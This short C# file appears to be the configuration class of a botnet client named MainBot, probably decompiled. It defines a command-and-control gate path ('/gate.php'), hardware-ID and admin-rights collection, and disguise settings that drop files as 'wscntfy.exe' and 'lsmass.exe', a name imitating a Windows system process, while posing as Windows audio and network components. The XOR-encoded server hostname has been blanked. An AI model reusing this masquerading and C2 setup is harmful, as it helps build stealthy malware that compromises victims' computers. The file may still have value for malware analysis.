namespace MainBot
{
    using System;

    internal class Configuration
    {
        public static string CurrentFilename = Process.GetCurrentProcess().MainModule.FileName;
        public static string GatePHP = "/gate.php";
        public static string HWID1 = InfoHelper.GetHWID();
        public static string HWID2 = Util.GetUserAgent();
        public static bool IsAdmin = InfoHelper.IsAdmin();
        public static string OS = InfoHelper.GetOS();
        public static string[] ProcessFiles = new string[] { "wscntfy.exe", "lsmass.exe" };
        public static string[] ProcessNames = new string[] { "Windows-Audio Driver", "Windows-Network Component" };
        public static int Timeout = 0x1000000;
        public static ushort ushort_0 = 0;
        public static int WaitTime = 80;
        public static byte[] XOREDHostname = Convert.FromBase64String(""); // Entfernt
    }
}

